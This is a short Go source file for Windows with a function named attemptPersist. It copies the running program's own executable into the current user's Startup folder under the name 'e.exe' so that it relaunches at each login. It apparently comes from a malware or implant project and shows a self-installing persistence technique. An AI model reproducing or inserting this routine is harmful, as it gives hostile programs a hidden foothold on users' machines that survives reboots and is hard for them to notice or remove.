// +build windows
package main

import (
	"os/user"
	"path"

	"github.com/kardianos/osext"
)

func attemptPersist() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	startupPath := currentUser.HomeDir + `\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
	ourPath, err := osext.Executable()
	if err != nil {
		return err
	}
	return copyFile(path.Join(startupPath, "e.exe"), ourPath)
}
